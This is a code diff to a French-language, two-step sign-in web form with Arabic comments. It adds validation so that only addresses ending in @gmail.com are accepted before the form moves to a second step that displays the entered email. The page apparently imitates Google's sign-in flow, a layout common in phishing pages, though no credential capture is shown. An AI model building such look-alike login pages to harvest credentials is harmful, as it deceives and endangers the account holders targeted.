@@ -166,7 +166,14 @@
 
       <form id="step1Form">
         <div class="input-group">
-          <input type="text" id="emailInput" required autocomplete="off">
+          <!-- إضافة شرط pattern لمنع القبول إلا إذا كان ينتهي بـ @gmail.com -->
+          <input 
+            type="email" 
+            id="emailInput" 
+            required 
+            pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$"
+            title="Veuillez saisir une adresse e-mail valide se terminant par @gmail.com"
+            autocomplete="off">
           <label for="emailInput">Adresse e-mail ou téléphone</label>
         </div>
         
@@ -235,7 +242,16 @@
     // Étape 1 -> Étape 2
     step1Form.addEventListener('submit', function(e) {
       e.preventDefault();
-      userEmailDisplay.textContent = emailInput.value;
+      
+      const emailVal = emailInput.value.trim();
+      
+      // التحقق البرمجي الإضافي من اللاحقة @gmail.com
+      if (!emailVal.toLowerCase().endsWith('@gmail.com')) {
+        alert("Veuillez saisir une adresse e-mail valide se terminant par @gmail.com");
+        return;
+      }
+
+      userEmailDisplay.textContent = emailVal;
       step1Div.style.display = 'none';
       step2Div.style.display = 'block';
     });
